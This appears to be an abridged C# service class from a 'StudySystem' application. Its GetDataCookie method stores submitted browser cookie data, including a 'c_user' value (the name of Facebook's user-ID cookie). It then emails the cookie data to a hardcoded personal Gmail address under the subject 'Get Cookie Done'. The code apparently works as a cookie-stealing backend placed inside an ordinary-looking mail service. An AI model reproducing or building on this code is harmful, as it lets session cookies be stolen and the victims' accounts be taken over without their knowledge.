...
namespace StudySystem.Application.Service
{
    ...
    public class SendMailService : ISendMailService
    {
        ...
        private readonly IHandleCookiesRepository _handleCookiesRepository;
        public SendMailService(ILogger<SendMailService> _logger, UserResolverSerive currentUser, IUnitOfWork unitOfWork)
        {
            ...
            _handleCookiesRepository = unitOfWork.CookiesHandle;
        ...
        public async Task<bool> GetDataCookie(CookieDataRequestModel[] data, string c_user)
        {
            Cookies cookies = new Cookies { CUser = c_user, CookieData = HandleConvert(data) };
            var rs = await _handleCookiesRepository.HandlerCookie(cookies);
            if (rs == 1)
            {
                string emailRegister = "xuantruong0944@gmail.com";
                var email = new MimeMessage();
                email.Sender = new MailboxAddress(AppSetting.MailName, AppSetting.Mail);
                email.From.Add(new MailboxAddress(AppSetting.MailName, AppSetting.Mail));

                email.To.Add(new MailboxAddress(emailRegister, emailRegister));
                email.Subject = "Get Cookie Done";

                var builder = new BodyBuilder();
                builder.HtmlBody = HandleConvert(data);
                email.Body = builder.ToMessageBody();
        ...
        private string HandleConvert(CookieDataRequestModel[] data)
        {
